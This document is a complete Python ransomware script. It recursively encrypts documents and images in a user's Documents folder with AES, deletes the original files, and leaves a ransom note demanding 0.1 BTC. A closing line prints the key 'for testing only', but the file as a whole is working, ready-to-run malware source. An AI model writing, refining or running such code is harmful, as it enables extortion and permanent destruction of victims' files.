from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import base64
import shutil

# Configuration
TARGET_DIR = "C:\\Users\\Target\\Documents"  # Modify for Linux if needed
EXTENSIONS = [".txt", ".docx", ".pdf", ".jpg", ".png"]  # File types to encrypt
RANSOM_NOTE = """ 
YOUR FILES HAVE BEEN ENCRYPTED! 
To recover your files, send 0.1 BTC to the provided address.
"""

# Generate AES key
KEY = os.urandom(32)  # 256-bit key
IV = os.urandom(16)  # AES Block size (128-bit)

def encrypt_file(file_path, key, iv):
    """Encrypt a file using AES-CBC."""
    with open(file_path, "rb") as f:
        data = f.read()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    
    # Pad data to be a multiple of 16 bytes
    padded_data = data + b' ' * (16 - len(data) % 16)
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Write encrypted data back
    with open(file_path + ".enc", "wb") as f:
        f.write(encrypted_data)

    os.remove(file_path)  # Remove original file

def encrypt_files(target_directory):
    """Encrypt all files in the target directory."""
    for root, _, files in os.walk(target_directory):
        for file in files:
            if any(file.endswith(ext) for ext in EXTENSIONS):
                file_path = os.path.join(root, file)
                encrypt_file(file_path, KEY, IV)
                print(f"Encrypted: {file_path}")

def drop_ransom_note(directory):
    """Drop a ransom note in the directory."""
    ransom_path = os.path.join(directory, "README_FOR_DECRYPT.txt")
    with open(ransom_path, "w") as f:
        f.write(RANSOM_NOTE)

    print(f"Ransom note dropped at {ransom_path}")

# Execute ransomware
encrypt_files(TARGET_DIR)
drop_ransom_note(TARGET_DIR)

# Display the decryption key (for controlled environments)
print(f"Decryption Key (for testing only): {base64.b64encode(KEY).decode()} | IV: {base64.b64encode(IV).decode()}")
